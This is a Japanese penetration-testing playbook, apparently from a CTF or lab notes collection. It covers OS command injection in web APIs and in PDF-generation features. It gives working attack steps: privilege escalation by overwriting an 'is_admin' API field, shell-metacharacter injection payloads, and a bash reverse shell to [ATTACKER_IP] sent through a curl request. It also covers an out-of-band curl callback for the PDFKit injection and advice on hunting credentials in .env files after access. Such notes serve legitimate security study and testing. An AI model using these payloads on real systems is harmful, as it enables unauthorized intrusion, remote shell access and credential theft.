# OSコマンドインジェクション

## 着火条件
- Webアプリ・APIが外部入力をOSコマンドの一部として組み込んでいる
- VPN設定生成・ping・traceroute・ファイル変換など、OSコマンドを内部で実行することが想定される機能がある
- APIが `username`, `host`, `ip`, `domain`, `target` 等のパラメータを受け取り、処理結果（ファイル内容・コマンド出力）を返す

## 観点・着眼点

**コマンドインジェクションを疑うシグナル：**

| APIの特徴 | 次のアクション |
|----------|--------------|
| `username`, `host`, `ip` 等の識別子パラメータを受け取る | セミコロン + `id` で注入テスト |
| レスポンスが「設定ファイル内容」「コマンド出力っぽいテキスト」を返す | 入力がそのままコマンドに渡されている可能性が高い |
| パラメータを空にすると「Missing parameter」エラーが返る | サーバー側でのコマンド組み立てを示唆 |
| `; sleep 5` を送ると応答が5秒遅延する | タイムベースで確認できる |

**管理者専用APIにコマンドインジェクションがある場合が多い：**
一般ユーザーがアクセスできるAPIにはインジェクションがなく、管理者APIにある、というパターンが典型。まずAPI権限を昇格させてから試みる。

---

## 手順

## Step 0: API一覧の取得

認証後のセッションで `/api/v1` 等のルートエンドポイントを叩くと、全エンドポイント一覧が返ることがある。

```bash
curl http://[TARGET]/api/v1 -H "Cookie: PHPSESSID=<セッション>"
# → admin用エンドポイント（PUT/POST等）が一覧で得られる
```

**標準的なワードリストでAPIエンドポイントのファジングが失敗する場合、** `/api/v1` 直叩きで一覧が取れることがある。

---

## Step 1: APIパラメータ改ざんによる権限昇格（必要な場合）

認証後のAPIが `is_admin`, `role`, `privilege` 等のフィールドをクライアント側からの更新リクエストで受け付ける設計になっている場合、そのフィールドを改ざんすることで権限昇格できる（Broken Function Level Authorization）。

```bash
# 管理者設定更新APIへの改ざんリクエスト例
curl -X PUT http://[TARGET]/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<セッション>" \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "is_admin": 1}'
# レスポンスに "is_admin":1 が返れば管理者権限取得

# 確認
curl http://[TARGET]/api/v1/admin/auth -H "Cookie: PHPSESSID=<セッション>"
```

**着眼点：** APIレスポンスに `is_admin`, `role`, `admin` 等のフィールドが含まれる場合、それをPUT/PATCHで上書きできないか試す。HTTP メソッドを変えながらエラーメッセージの変化を見ると設計が見えてくる。

---

## Step 2: コマンドインジェクションテスト

```bash
# 基本確認（セミコロン区切り）
{"username": "test; id"}
{"username": "test; whoami"}

# タイムベース確認（応答が遅延すればコマンドが実行されている）
{"username": "test; sleep 5"}

# その他のシェルメタ文字
{"username": "test && id"}
{"username": "test | id"}
{"username": "test$(id)"}
{"username": "`id`"}
```

レスポンスに `uid=` が含まれればコマンドインジェクション確定。

---

## Step 3: リバースシェル取得

> リバースシェルの仕組み・ポート選択・VPN環境でのIP確認 → `../../06_Concepts/Reverse_Shell.md`

**テスター端末でリスナーを起動：**
```bash
nc -lvnp 4444
```

**ペイロード：**
```bash
bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'
```

**curlで送信する場合のシングルクォートエスケープ：**
```bash
curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<セッション>" \
  -H "Content-Type: application/json" \
  -d '{"username": "test; bash -c '"'"'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'"'"'"}'
```

`'"'"'` の分解：
- `'` → curlシングルクォートを閉じる
- `"'"` → ダブルクォートでシングルクォート1文字を渡す
- `'` → curlシングルクォートを再度開く

---

## Step 4: シェル安定化

リバースシェル取得直後にTTYが割り当てられていないため、`sudo` / `su` 等が使えない。

> シェル安定化の詳細手順 → `../../03_Post_Access_Linux/Shell_Stabilization.md`

## 注意点・落とし穴
- コマンドインジェクションのテストは**まず `id` で確認してからリバースシェルへ移行**する。確認なしにシェル取得を試みると成否が判断できない
- www-dataや低権限ユーザーでシェルが取れた場合、`.env` / 設定ファイル等の認証情報を探して横展開・権限昇格を目指す
- API管理者昇格はすべてのAPIで成立するわけではない。`is_admin` フィールドの存在と書き込み可能であることが前提
- POSTボディの Content-Type が `application/json` でなく `application/x-www-form-urlencoded` の場合はパラメータ形式が `key=value&...` になる
- 標準的なワードリストでAPIエンドポイントのファジングが失敗することがある（API専用パスが一般的なディレクトリ名と異なるため）。`/api/v1` 直叩きで一覧取得を先に試みる

## 関連技術
- 前：難読化JSからAPIエンドポイント発見 → `./JS_Obfuscation.md`
- 前：APIエンドポイント列挙・ディレクトリ探索 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：シェル安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：侵入後の .env ファイル・認証情報探索 → `../../02_Initial_Access/Credential_Discovery.md`
- 関連：リバースシェルの仕組み・ポート選択・IP確認 → `../../06_Concepts/Reverse_Shell.md`

---

## URL 入力フォームを持つ PDF 生成・Web 変換機能のコマンドインジェクション

## 着火条件
- Webアプリに「URL を入力して PDF / 画像 / スクリーンショットを生成する」機能がある
- レスポンスヘッダーに `X-Runtime`（Ruby）/ `X-Powered-By`（フレームワーク名）等が含まれる
- 生成された PDF のメタデータにライブラリ名とバージョンが含まれる

## 環境前提
- 実行環境: テスター端末 + ターゲット（PDF / 画像変換ライブラリが動作中）
- 必要なツール: `exiftool`（ペネトレ用Linuxディストリ標準）、`nc`（ペネトレ用Linuxディストリ標準）、`python3`（ペネトレ用Linuxディストリ標準）

## 観点・着眼点

**先に確認すること：**
1. レスポンスヘッダーの `X-Runtime` / `X-Powered-By` / `Server` で使用言語・フレームワークを確認
2. 生成物（PDF 等）のメタデータでライブラリ名・バージョンを確認

```bash
# [Attacker] PDF のメタデータ確認
exiftool [ダウンロードした].pdf
# → "Producer", "Creator" 等にライブラリ名・バージョンが出る
# 例: Producer : pdfkit v0.8.6
```

3. バージョンが判明したら即 searchsploit → CVE を特定する

```bash
# [Attacker] バージョン検索
searchsploit pdfkit
searchsploit [ライブラリ名] [バージョン]
```

**バックティック注入が刺さるシグナル（RCE の事前確認）：**

| テスト内容 | 結果 | 意味 |
|-----------|------|------|
| URL パラメータに `` `sleep 5` `` を含めて送信 | 応答が 5 秒遅延する | コマンドが実行されている（タイムベース確認） |
| `` `curl http://[ATTACKER_IP]:PORT/` `` を送信し nc で待機 | nc に GET リクエストが届く | OOB で RCE 確認 |

## 手順概要（ペイロード全文は CVE_Notes.md を参照）

1. ライブラリ名・バージョンを特定（exiftool / レスポンスヘッダー）
2. searchsploit → CVE 番号を確認 → `../../05_Tools_Reference/CVE_Notes.md` でペイロードを確認
3. nc リスナーと HTTP サーバー（シェルスクリプト配信用）を起動
4. URL フォームにペイロードを送信してシェルを取得

> 具体的なペイロード・事前準備手順（PDFKit CVE-2022-25765 の curl コマンド・rev.sh テンプレート）→ `../../05_Tools_Reference/CVE_Notes.md`

## 刺さらなかったとき
- バックティックが無効 → `$(command)` ドル記法を試す
- バージョンがパッチ済み → SSRF として内部ネットワーク探索に切り替える（`SSRF.md`）
- `X-Runtime` がない → 別言語の変換ライブラリを使っている可能性。メタデータで特定してから searchsploit で再検索

## 注意点・落とし穴
- HTTP サーバー（シェルスクリプト配信）は **nc リスナーより先に起動する**
- `[ATTACKER_IP]` にはテスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う。`ip a` で全インターフェース確認
- シェル取得直後は TTY なし → sudo -l 等の前に必ずシェル安定化を行う

## 関連技術
- 前：URL を入力できるフォームの発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：シェル安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：侵入後の認証情報探索（`.bundle/config` 等） → `../../02_Initial_Access/Credential_Discovery.md`
- 関連：CVE ペイロード詳細 → `../../05_Tools_Reference/CVE_Notes.md`
- 関連：バージョンがパッチ済みの場合の SSRF への切り替え → `./SSRF.md`
